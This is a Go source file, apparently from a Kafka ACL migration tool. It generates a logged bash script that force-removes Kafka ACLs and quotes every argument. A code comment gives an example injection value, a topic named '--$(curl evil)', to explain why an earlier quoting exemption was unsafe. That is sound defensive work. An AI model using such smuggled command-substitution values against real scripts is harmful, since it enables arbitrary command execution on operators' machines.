// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2025 Monedula contributors

package acls

import (
	"fmt"
	"path/filepath"
	"strings"
	"time"

	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/delete/common"
	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/emit/shell"
	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/rundir"
	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/types"
	"github.com/monedula-dev/monedula-acl-rbac-converter/pkg/aclrbac/version"
)

func writeScript(opts Options, rows []types.ACLRow, dest string) error {
	abs, err := filepath.Abs(opts.RunDir)
	if err != nil {
		return err
	}

	planSHA, err := common.FileSHA256(opts.PlanPath)
	if err != nil {
		return err
	}
	verifySHA, err := common.FileSHA256(opts.VerifyPath)
	if err != nil {
		return err
	}

	var b strings.Builder
	b.WriteString(common.BuildScriptHeader(common.HeaderInputs{
		ToolVersion:      version.Version,
		GeneratedAt:      time.Now().UTC(),
		PlanSHA256:       planSHA,
		VerifySHA256:     verifySHA,
		BootstrapServers: opts.BootstrapServers,
		CommandConfig:    opts.CommandConfig,
		Principals:       opts.Principals,
		RunDir:           abs,
	}))

	logFile := filepath.Join(abs, "delete.log")
	b.WriteString("LOG=" + shell.Quote(logFile) + "\n\n")
	b.WriteString("ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }\n")
	b.WriteString("log() { printf '%s\\t%s\\n' \"$(ts)\" \"$1\" >> \"$LOG\"; }\n\n")

	b.WriteString("trap 'log SUMMARY exit=$?' EXIT\n\n")

	for _, r := range rows {
		writeRemove(&b, r, opts)
	}

	// 0o700: executable for owner only. The deletion script is
	// destructive; world-readable on shared hosts would let any user
	// inspect or copy a kafka-acls --remove invocation.
	if err := rundir.WriteAtomic(dest, []byte(b.String()), 0o700); err != nil {
		return fmt.Errorf("write %s: %w", dest, err)
	}
	return nil
}

func writeRemove(b *strings.Builder, r types.ACLRow, opts Options) {
	args := []string{
		"kafka-acls", "--bootstrap-server", opts.BootstrapServers,
	}
	if opts.CommandConfig != "" {
		args = append(args, "--command-config", opts.CommandConfig)
	}
	args = append(args,
		"--remove", "--force",
		"--allow-principal", r.Principal,
		"--operation", string(r.Operation),
		"--resource-pattern-type", strings.ToLower(string(r.PatternType)),
	)
	switch r.ResourceType {
	case types.ResourceTopic:
		args = append(args, "--topic", r.ResourceName)
	case types.ResourceGroup:
		args = append(args, "--group", r.ResourceName)
	case types.ResourceCluster:
		args = append(args, "--cluster")
	case types.ResourceTransactionalID:
		args = append(args, "--transactional-id", r.ResourceName)
	case types.ResourceDelegationToken:
		args = append(args, "--delegation-token", r.ResourceName)
	}

	// Quote EVERY argv element except the binary at args[0]. An earlier
	// revision exempted anything starting with "--" so literal flag NAMES like
	// `--remove` stayed bare — but the same check also matched operator-
	// supplied VALUES that happen to start with "--" (e.g. a topic named
	// `--$(curl evil)`), so a crafted resource_name escaped quoting and would
	// have produced bash command substitution at script-run time.
	// shell.Quote'ing a literal flag name is harmless: bash strips the single
	// quotes before argv reaches kafka-acls, which parses the flag identically.
	quoted := make([]string, 0, len(args))
	for i, a := range args {
		if i == 0 {
			quoted = append(quoted, a) // binary, never operator-controlled
			continue
		}
		quoted = append(quoted, shell.Quote(a))
	}

	fmt.Fprintf(b, "if %s; then log 'OK acl_id=%d'; else log 'FAIL acl_id=%d'; exit 1; fi\n",
		strings.Join(quoted, " "), r.ID, r.ID)
}
